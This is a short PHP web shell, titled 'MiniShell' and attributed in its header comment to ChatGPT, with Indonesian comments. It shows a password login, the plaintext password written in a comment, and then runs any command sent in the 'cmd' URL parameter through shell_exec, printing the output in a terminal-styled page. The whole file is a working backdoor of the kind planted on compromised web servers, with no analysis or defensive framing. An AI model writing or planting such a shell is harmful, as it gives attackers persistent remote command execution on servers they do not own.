<?php
// === MiniShell by ChatGPT ===
// Password bcrypt (hash dari: superkuat123)
$hashed_pass = '$2y$10$u7u43mufPqtvdbDxk6YY/OZ6brbgxZyaNScmhHKezdkQZjFuKjxjW';

session_start();
if (!isset($_SESSION['loggedin'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashed_pass)) {
            $_SESSION['loggedin'] = true;
        } else {
            echo "<h3>Access Denied</h3>";
            exit;
        }
    } else {
        echo '<form method="POST"><input type="password" name="password" placeholder="Password">';
        echo '<button type="submit">Login</button></form>';
        exit;
    }
}

// Setelah login:
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    exit;
}
?>

<!DOCTYPE html>
<html>
<head><title>MiniShell</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;padding:20px;">
<h2>MiniShell</h2>
<form method="GET">
    <input type="text" name="cmd" style="width:80%;" autofocus>
    <button>Run</button>
</form>
</body>
</html>
